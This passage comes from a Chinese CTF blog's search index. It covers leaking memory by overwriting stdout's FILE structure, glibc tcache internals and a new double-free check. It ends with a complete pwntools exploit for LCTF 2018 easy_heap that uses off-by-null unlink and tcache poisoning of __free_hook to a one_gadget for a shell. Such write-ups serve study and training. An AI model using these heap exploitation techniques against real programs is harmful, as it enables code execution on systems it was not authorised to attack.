了优化效率，会将其分配到栈上⽽不是堆上，这样就能栈溢出ROP了，这题⽐较坑的⼀个地⽅是如何结束输⼊。]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
        <tag>bctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leak From Stdout]]></title>
    <url>%2F2018%2F11%2F29%2Fleak-from-stdout%2F</url>
    <content type="text"><![CDATA[在最近的一些题目中，多次运用到了修改stdout的FILE结构体中的缓冲区指针进行信息泄漏，参考了大佬们阅读源代码的博客，记录一下。 以下是三个涉及FILE的主要结构体： _IO_FILE_plus结构体： 1234567891011// from libioP.h in glibc/* We always allocate an extra word following an _IO_FILE. This contains a pointer to the function jump table used. This is for compatibility with C++ streambuf; the word can be used to smash to a pointer to a virtual function table. */struct _IO_FILE_plus&#123; _IO_FILE file; const struct _IO_jump_t *vtable;&#125;; _IO_FILE结构体： 12345678910111213141516171819202122232425262728293031323334353637383940414243// from /usr/include/libio.hstruct _IO_FILE &#123; int _flags; /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno;#if 0 int _blksize;#else int _flags2;#endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */#define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;; _IO_jump_t结构体： 1234567891011121314151617181920212223242526272829struct _IO_jump_t&#123; JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue);#if 0 get_column; set_column;#endif&#125;; 以下是FILE结构体进行输出时的相关代码： 123456789101112131415161718// from fileops.c in glibcint _IO_new_file_overflow (_IO_FILE *f, int ch)&#123; if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */ &#123; //... return EOF; &#125; if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL) &#123; //... &#125; if (ch == EOF) // 攻击者想到执行到的代码位置 return _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base); //...&#125;libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow) 从代码中可以看出，如果想要执行return _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);并尽可能减少其他不必要的代码执行，就需要满足下列三个条件： f-&gt;_flags &amp; _IO_NO_WRITES == 0 (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != 0 f-&gt;_IO_write_base != 0 下面来看_IO_do_write函数： 123456789101112131415161718192021222324252627282930313233343536373839404142// from fileops.c in glibcint _IO_new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)&#123; // 实际调用new_do_write函数 return (to_do == 0 || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;&#125;libc_hidden_ver (_IO_new_do_write, _IO_do_write)static _IO_size_t new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)&#123; _IO_size_t count; if (fp-&gt;_flags &amp; _IO_IS_APPENDING) //需要使这个if成立 /* On a system without a proper O_APPEND implementation, you would need to sys_seek(0, SEEK_END) here, but is not needed nor desirable for Unix- or Posix-like systems. Instead, just indicate that offset (before and after) is unpredictable. */ fp-&gt;_offset = _IO_pos_BAD; else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base) &#123; //fp-&gt;_IO_write_base - fp-&gt;_IO_read_end非常大，如果read被置为0 _IO_off64_t new_pos = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1); if (new_pos == _IO_pos_BAD) return 0; fp-&gt;_offset = new_pos; &#125; // fp=stdout data=stdout-&gt;_IO_write_base to_do=f-&gt;_IO_write_ptr - f-&gt;_IO_write_base count = _IO_SYSWRITE (fp, data, to_do); if (fp-&gt;_cur_column &amp;&amp; count) fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - 1, data, count) + 1; _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base); // 重置write的指针 fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base; fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= 0 &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED)) ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end); return count;&#125; 所以需要满足下列四个条件： f-&gt;_flags &amp; _IO_NO_WRITES == 0 (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != 0 f-&gt;_IO_write_base != 0 fp-&gt;_flags &amp; _IO_IS_APPENDING != 0 进而能够调用_IO_SYSWRITE (fp, data, to_do)即 1_IO_SYSWRITE (stdout, stdout-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) 所以需要将flag设置为： 1234_flags = 0xfbad0000 // Magic number_flags &amp; = ~_IO_NO_WRITES // _flags = 0xfbad0000_flags | = _IO_CURRENTLY_PUTTING // _flags = 0xfbad0800_flags | = _IO_IS_APPENDING // _flags = 0xfbad1800 参考文章： https://vigneshsrao.github.io/babytcache/ http://tacxingxing.com/2018/02/09/fsp/]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>file</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Play With Tcache & LCTF 2018 easy_heap]]></title>
    <url>%2F2018%2F11%2F22%2Fplay-with-tcache%2F</url>
    <content type="text"><![CDATA[tcache简介tcache是在libc 2.27中加入的chunk快速缓存机制。在malloc.c中有如下定义： 共有64个tcache bin。 使用tidx2usize(idx)对tcache的chunk进行大小计算。 每个tcache bin最多存有TCACHE_FILL_COUNT个chunk（默认为7）。 从代码中也可以看出，tcache是线程独立的，每一个线程拥有自己的tcache_perthread_struct结构体，该结构体记录每一个bin的入口和每一个bin中被放入的chunk的数量。 1234567891011121314151617181920212223242526/* We want 64 entries. This is an arbitrary limit, which tunables can reduce. */# define TCACHE_MAX_BINS 64# define MAX_TCACHE_SIZE tidx2usize (TCACHE_MAX_BINS-1)/* Only used to pre-fill the tunables. */# define tidx2usize(idx) (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)/* This is another arbitrary limit, which tunables can change. Each tcache bin will hold at most this number of chunks. */# define TCACHE_FILL_COUNT 7typedef struct tcache_entry&#123; struct tcache_entry *next;&#125; tcache_entry;/* There is one of these for each thread, which contains the per-thread cache (hence "tcache_perthread_struct"). Keeping overall size low is mildly important. Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons. */typedef struct tcache_perthread_struct&#123; char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS];&#125; tcache_perthread_struct; tcache的操作libc中存取tcache中的chunk主要通过tcache_put和tcache_get两个函数实现。在malloc()和free()的本体和马甲中，均有tcache_put和tcache_get的调用。 tcache_put()1234567891011121314151617// malloc.c:2923/* Caller must ensure that we know tc_idx is valid and there's room for more chunks. */static __always_inline voidtcache_put (mchunkptr chunk, size_t tc_idx)&#123; // 获取chunk用于保存内容的地址，进行强制类型转换 tcache_entry *e = (tcache_entry *) chunk2mem (chunk); // 对于idx的安全检查 assert (tc_idx &lt; TCACHE_MAX_BINS); // next指针指向对应bin中的第一个chunk e-&gt;next = tcache-&gt;entries[tc_idx]; // 插入对应bin中的第一个地址 tcache-&gt;entries[tc_idx] = e; // 计数加1 ++(tcache-&gt;counts[tc_idx]);&#125; tcache_get()1234567891011121314151617/* Caller must ensure that we know tc_idx is valid and there's available chunks to remove. */static __always_inline void *tcache_get (size_t tc_idx)&#123; // 获取相应的bin tcache_entry *e = tcache-&gt;entries[tc_idx]; // 对于idx的安全检查 assert (tc_idx &lt; TCACHE_MAX_BINS); // 检测bin是否为空 assert (tcache-&gt;entries[tc_idx] &gt; 0); // 获得chunk tcache-&gt;entries[tc_idx] = e-&gt;next; // 计数减1 --(tcache-&gt;counts[tc_idx]); return (void *) e;&#125; __libc_malloc()1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#define checked_request2size(req, sz) \(&#123; \ (sz) = request2size (req); \ if (((sz) &lt; (req)) \ || REQUEST_OUT_OF_RANGE (sz)) \ &#123; \ __set_errno (ENOMEM); \ return 0; \ &#125; \&#125;)void *__libc_malloc (size_t bytes)&#123; mstate ar_ptr; void *victim; void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) // __malloc_hook check return (*hook)(bytes, RETURN_ADDRESS (0));#if USE_TCACHE /* int_free also calls request2size, be careful to not pad twice. */ size_t tbytes; // 转换为tbytes checked_request2size (bytes, tbytes); size_t tc_idx = csize2tidx (tbytes); // 计算tcache index MAYBE_INIT_TCACHE (); DIAG_PUSH_NEEDS_COMMENT; if (tc_idx &lt; mp_.tcache_bins /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */ &amp;&amp; tcache &amp;&amp; tcache-&gt;entries[tc_idx] != NULL) // idx安全检查，且对应bin非空 &#123; return tcache_get (tc_idx); // 调用tcache_get() &#125; DIAG_POP_NEEDS_COMMENT;#endif if (SINGLE_THREAD_P) &#123; victim = _int_malloc (&amp;main_arena, bytes); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || &amp;main_arena == arena_for_chunk (mem2chunk (victim))); return victim; &#125; arena_get (ar_ptr, bytes); // 否则调用_int_malloc victim = _int_malloc (ar_ptr, bytes); /* Retry with another arena only if we were able to find a usable arena before. */ if (!victim &amp;&amp; ar_ptr != NULL) &#123; LIBC_PROBE (memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); &#125; if (ar_ptr != NULL) __libc_lock_unlock (ar_ptr-&gt;mutex); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || ar_ptr == arena_for_chunk (mem2chunk (victim))); return victim;&#125; __libc_free()123456789101112131415161718192021222324252627282930313233343536373839404142void__libc_free (void *mem)&#123; mstate ar_ptr; mchunkptr p; /* chunk corresponding to mem */ void (*hook) (void *, const void *) = atomic_forced_read (__free_hook); if (__builtin_expect (hook != NULL, 0)) // __free_hook check &#123; (*hook)(mem, RETURN_ADDRESS (0)); return; &#125; if (mem == 0) /* free(0) has no effect */ return; p = mem2chunk (mem); // 获取chunk的指针 if (chunk_is_mmapped (p)) /* release mmapped memory. */ &#123; /* See if the dynamic brk/mmap threshold needs adjusting. Dumped fake mmapped chunks do not affect the threshold. */ if (!mp_.no_dyn_threshold &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p)) &#123; mp_.mmap_threshold = chunksize (p); mp_.trim_threshold = 2 * mp_.mmap_threshold; LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2, mp_.mmap_threshold, mp_.trim_threshold); &#125; munmap_chunk (p); return; &#125; MAYBE_INIT_TCACHE (); // 初始化tcache ar_ptr = arena_for_chunk (p); _int_free (ar_ptr, p, 0); // real free&#125; _int_malloc()fastbin123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// malloc.c:3581 if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ())) &#123; // 如果申请的chunk大小在fasbin的范围内 idx = fastbin_index (nb); // 计算fastbin的idx mfastbinptr *fb = &amp;fastbin (av, idx); // 获取对应的fastbin mchunkptr pp; victim = *fb; // 命中的chunk if (victim != NULL) // 如果对应的fastbin中有chunk &#123; if (SINGLE_THREAD_P) *fb = victim-&gt;fd; // 取出bin第一个chunk else REMOVE_FB (fb, pp, victim); // 从多线程中移除一个fastbin chunk if (__glibc_likely (victim != NULL)) // 如果命中fastbin chunk &#123; size_t victim_idx = fastbin_index (chunksize (victim)); if (__builtin_expect (victim_idx != idx, 0)) // idx安全检查 malloc_printerr ("malloc(): memory corruption (fast)"); check_remalloced_chunk (av, victim, nb);#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); // 将命中的大小的fastbin的剩余chunk放入tcache中（如果对应的tcache还没满） if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != NULL) &#123; if (SINGLE_THREAD_P) *fb = tc_victim-&gt;fd; else &#123; REMOVE_FB (fb, pp, tc_victim); if (__glibc_unlikely (tc_victim == NULL)) break; &#125; tcache_put (tc_victim, tc_idx); // 放入tcache &#125; &#125;#endif void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; &#125; small bin1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#define first(b) ((b)-&gt;fd)#define last(b) ((b)-&gt;bk) /* If a small request, check regular bin. Since these "smallbins" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if (in_smallbin_range (nb)) // 如果在smallbin的范围内 &#123; idx = smallbin_index (nb); // 获取smallbin index bin = bin_at (av, idx); // 获取smallbin if ((victim = last (bin)) != bin) // 检查是否有chunk &#123; bck = victim-&gt;bk; if (__glibc_unlikely (bck-&gt;fd != victim)) // 检查链表，victiom-&gt;bk-&gt;fd与victim malloc_printerr ("malloc(): smallbin double linked list corrupted"); set_inuse_bit_at_offset (victim, nb); bin-&gt;bk = bck; bck-&gt;fd = bin; // 取出victim if (av != &amp;main_arena) set_non_main_arena (victim); check_malloced_chunk (av, victim, nb);#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks over. */ // 将命中的大小的smallbin的剩余chunk放入tcache中（如果对应的tcache还没满） while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin) &#123; if (tc_victim != 0) &#123; bck = tc_victim-&gt;bk; set_inuse_bit_at_offset (tc_victim, nb); // 没有安全检查 if (av != &amp;main_arena) set_non_main_arena (tc_victim); bin-&gt;bk = bck; bck-&gt;fd = bin; // 取出victim tcache_put (tc_victim, tc_idx); // 放入tcache &#125; &#125; &#125;#endif void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; /* If this is a large request, consolidate fastbins before continuing. While it might look excessive to kill all fastbins before even seeing if there is space available, this avoids fragmentation problems normally associated with fastbins. Also, in practice, programs tend to have runs of either small or large requests, but less often mixtures, so consolidation is not invoked all that often in most programs. And the programs that it is called frequently in otherwise tend to fragment. */ else // 如果不在small bin的范围内 &#123; idx = largebin_index (nb); if (atomic_load_relaxed (&amp;av-&gt;have_fastchunks)) malloc_consolidate (av); &#125; unsorted bin123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193 /* Process recently freed or remaindered chunks, taking one only if it is exact fit, or, if this a small request, the chunk is remainder from the most recent non-exact fit. Place other traversed chunks in bins. Note that this step is the only place in any routine where chunks are placed in bins. The outer loop here is needed because we might not realize until near the end of malloc that we should have consolidated, so must do so and retry. This happens at most once, and only when we would otherwise need to expand memory to service a "small" request. */#if USE_TCACHE INTERNAL_SIZE_T tcache_nb = 0; size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) // 如果大小属于tcache范围 tcache_nb = nb; // 赋值tcache_nb int return_cached = 0; tcache_unsorted_count = 0;#endif for (;; ) &#123; int iters = 0; while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) &#123; bck = victim-&gt;bk; // 大小检查 if (__builtin_expect (chunksize_nomask (victim) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize_nomask (victim) &gt; av-&gt;system_mem, 0)) malloc_printerr ("malloc(): memory corruption"); size = chunksize (victim); /* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk. */ if (in_smallbin_range (nb) &amp;&amp; bck == unsorted_chunks (av) &amp;&amp; victim == av-&gt;last_remainder &amp;&amp; (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) &#123; /* split and reattach remainder */ remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder; av-&gt;last_remainder = remainder; remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av); if (!in_smallbin_range (remainder_size)) &#123; remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; /* remove from unsorted list */ unsorted_chunks (av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunks (av); /* Take now instead of binning if exact fit */ if (size == nb) // 如果大小正好匹配 &#123; set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) set_non_main_arena (victim);#if USE_TCACHE /* Fill cache first, return to user only if cache fills. We may return one of these chunks later. */ if (tcache_nb &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) &#123; tcache_put (victim, tc_idx); // 放入tcache return_cached = 1; continue; &#125; else &#123;#endif check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p;#if USE_TCACHE &#125;#endif &#125; // if (size == nb) /* place chunk in bin */ // 如果大小不相等，则放入相应的bin中 if (in_smallbin_range (size)) &#123; victim_index = smallbin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; &#125; else &#123; victim_index = largebin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; /* maintain large bins in sorted order */ if (fwd != bck) &#123; /* Or with inuse bit to speed comparisons */ size |= PREV_INUSE; /* if smaller than smallest, bypass loop below */ assert (chunk_main_arena (bck-&gt;bk)); if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk)) &#123; fwd = bck; bck = bck-&gt;bk; victim-&gt;fd_nextsize = fwd-&gt;fd; victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; else &#123; assert (chunk_main_arena (fwd)); while ((unsigned long) size &lt; chunksize_nomask (fwd)) &#123; fwd = fwd-&gt;fd_nextsize; assert (chunk_main_arena (fwd)); &#125; if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd)) /* Always insert in the second position. */ fwd = fwd-&gt;fd; else &#123; victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; bck = fwd-&gt;bk; &#125; &#125; else victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim; &#125; mark_bin (av, victim_index); victim-&gt;bk = bck; victim-&gt;fd = fwd; fwd-&gt;bk = victim; bck-&gt;fd = victim;#if USE_TCACHE /* If we've processed as many chunks as we're allowed while filling the cache, return one of the cached ones. */ ++tcache_unsorted_count; if (return_cached &amp;&amp; mp_.tcache_unsorted_limit &gt; 0 /* tcache_unsorted_limit默认0，unlimit */ &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit) &#123; return tcache_get (tc_idx); // 从tcache中返回chunk &#125;#endif#define MAX_ITERS 10000 if (++iters &gt;= MAX_ITERS) break; &#125;#if USE_TCACHE /* If all the small chunks we found ended up cached, return one now. */ if (return_cached) // 有完全匹配的chunk放入tcache后return_cached才会True &#123; return tcache_get (tc_idx); &#125;#endif _int_free()1234567891011121314// malloc.c:4165 _int_free()的最前部位置#if USE_TCACHE &#123; size_t tc_idx = csize2tidx (size); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) // idx合法，bin仍有空间 &#123; tcache_put (p, tc_idx); // 放入tcache return; &#125; &#125;#endif Double Free Check昨天听说glibc的git上增加了一个Tcache Double Free的check的commit，就去看了下。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758--- a/malloc/malloc.c+++ b/malloc/malloc.c@@ -2967,6 +2967,8 @@ mremap_chunk (mchunkptr p, size_t new_size) typedef struct tcache_entry &#123; struct tcache_entry *next;+ /* This field exists to detect double frees. */+ struct tcache_perthread_struct *key; &#125; tcache_entry; /* There is one of these for each thread, which contains the@@ -2990,6 +2992,11 @@ tcache_put (mchunkptr chunk, size_t tc_idx) &#123; tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS);++ /* Mark this chunk as "in the tcache" so the test in _int_free will+ detect a double free. */+ e-&gt;key = tcache;+ e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]);@@ -3005,6 +3012,7 @@ tcache_get (size_t tc_idx) assert (tcache-&gt;entries[tc_idx] &gt; 0); tcache-&gt;entries[tc_idx] = e-&gt;next; --(tcache-&gt;counts[tc_idx]);+ e-&gt;key = NULL; return (void *) e; &#125; @@ -4218,6 +4226,26 @@ _int_free (mstate av, mchunkptr p, int have_lock) &#123; size_t tc_idx = csize2tidx (size); + /* Check to see if it's already in the tcache. */+ tcache_entry *e = (tcache_entry *) chunk2mem (p);++ /* This test succeeds on double free. However, we don't 100%+ trust it (it also matches random payload data at a 1 in+ 2^&lt;size_t&gt; chance), so verify it's not an unlikely coincidence+ before aborting. */+ if (__glibc_unlikely (e-&gt;key == tcache &amp;&amp; tcache))+ &#123;+ tcache_entry *tmp;+ LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);+ for (tmp = tcache-&gt;entries[tc_idx];+ tmp;+ tmp = tmp-&gt;next)+ if (tmp == e)+ malloc_printerr ("free(): double free detected in tcache 2");+ /* If we get here, it was a coincidence. We've wasted a few+ cycles, but don't abort. */+ &#125;+ if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) 在tcache_entry结构体中增加了key变量用于防止double free。 123456typedef struct tcache_entry&#123; struct tcache_entry *next; /* This field exists to detect double frees. */ struct tcache_perthread_struct *key;&#125; tcache_entry; 在tcache_put()中，key会被赋值为tcache，在tcache_get()中key会被置为NULL。 12345678910111213141516171819@@ -2990,6 +2992,11 @@ tcache_put (mchunkptr chunk, size_t tc_idx) &#123; tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS);++ /* Mark this chunk as "in the tcache" so the test in _int_free will+ detect a double free. */+ e-&gt;key = tcache;+ e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]);@@ -3005,6 +3012,7 @@ tcache_get (size_t tc_idx) assert (tcache-&gt;entries[tc_idx] &gt; 0); tcache-&gt;entries[tc_idx] = e-&gt;next; --(tcache-&gt;counts[tc_idx]);+ e-&gt;key = NULL; return (void *) e; &#125; doubule free的check主要是在_int_free()中，如果key的值为tcache，就会对相应的tcache bin进行遍历（防止误伤，如果该chunk的key正好为tcache），如果找到相应的chunk，则报错。 123456789101112131415161718192021222324252627@@ -4218,6 +4226,26 @@ _int_free (mstate av, mchunkptr p, int have_lock) &#123; size_t tc_idx = csize2tidx (size); + /* Check to see if it's already in the tcache. */+ tcache_entry *e = (tcache_entry *) chunk2mem (p);++ /* This test succeeds on double free. However, we don't 100%+ trust it (it also matches random payload data at a 1 in+ 2^&lt;size_t&gt; chance), so verify it's not an unlikely coincidence+ before aborting. */+ if (__glibc_unlikely (e-&gt;key == tcache &amp;&amp; tcache))+ &#123;+ tcache_entry *tmp;+ LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);+ for (tmp = tcache-&gt;entries[tc_idx];+ tmp;+ tmp = tmp-&gt;next)+ if (tmp == e)+ malloc_printerr ("free(): double free detected in tcache 2");+ /* If we get here, it was a coincidence. We've wasted a few+ cycles, but don't abort. */+ &#125;+ if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) LCTF 2018 easy_heap才疏学浅，比赛的时候没做出来，又复习了一遍tcache。 当malloc()时，申请的大小正好与unsorted bin中的chunk大小一致时，会被放入tcache。由于tcache只利用前8字节保存链表信息，因此从unsorted bin中被放入tcache的chunk的bk的值仍然被保留。 利用堆块中残留的bk指针的信息，进行unlink攻击（本题构造的也很巧妙，使得写入\x00后，能够将指针地址指回chunk的头部）。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687# coding=utf-8# 参考Nu1L writeup：https://xz.aliyun.com/t/3341from pwn import *def Add(p, size, content): p.sendlineafter('&gt; ', str(1)) p.sendlineafter('&gt; ', str(size)) p.sendlineafter('&gt; ', content)def Delete(p, idx): p.sendlineafter('&gt; ', str(2)) p.sendlineafter('&gt; ', str(idx))def Show(p, idx): p.sendlineafter('&gt; ', str(3)) p.sendlineafter('&gt; ', str(idx))def pwn(): BIN_PATH = './easy_heap' DEBUG = 1 context.arch = 'amd64' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: pass for i in range(10): Add(p, 0x20, 'sunichi') Delete(p, 1) for i in range(3, 8): Delete(p, i) Delete(p, 9) Delete(p, 8) Delete(p, 2) Delete(p, 0) for i in range(7): Add(p, 0x20, 'sunichi') p.sendlineafter('&gt; ', str(1)) p.sendlineafter('&gt; ', str(0)) p.sendafter('&gt; ', '') # change lowest byte of chunk address to 0x00 Add(p, 0xf8, '') # off by null byte to let itself can be unlink for i in range(0, 5): Delete(p, i) Delete(p, 6) Delete(p, 5) # trigger unlink Show(p, 8) recv = p.recvuntil('\n', drop=True) + '\x00\x00' libc.address = u64(recv) - (0x7ffff7dcfca0 - 0x7ffff79e4000) print hex(libc.address) for i in range(7): Add(p, 0x20, 'sunichi') Add(p, 0x20, 'sunichi') Delete(p, 0) Delete(p, 8) Delete(p, 1) Delete(p, 9) Add(p, 0x20, p64(libc.symbols['__free_hook'])[:6]) Add(p, 0x20, 'sunichi') Add(p, 0x20, 'sunichi') Add(p, 0x20, p64(libc.address + 0x4f322)[:6]) Delete(p, 1) p.interactive() p.close()if __name__ == '__main__': pwn()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>2018</tag>
        <tag>lctf</tag>
        <tag>tcache</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hctf 2018 heapstorm_zero]]></title>
    <url>%2F2018%2F11%2F21%2Fhctf18-heapstorm%2F</url>
